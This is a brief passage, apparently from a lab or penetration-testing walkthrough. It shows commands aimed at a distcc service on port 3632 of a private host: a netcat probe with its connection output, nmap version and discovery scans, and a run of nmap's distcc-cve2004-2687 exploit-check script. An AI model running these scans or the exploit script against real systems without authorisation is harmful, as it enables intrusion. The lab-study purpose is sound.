...
```bash
echo -e "DIST00000001" | nc -nv -q2 192.168.144.100 3632
```

```
Connection to 192.168.144.100 3632 port [tcp/*] succeeded!
```
...
```bash
nmap -sV -p 3632 --script default,discovery 192.168.144.100
```
...
```bash
nmap -sV -p 3632 --script default 192.168.144.100
```
...
```bash
nmap -p 3632 --script distcc-cve2004-2687 192.168.144.100
```
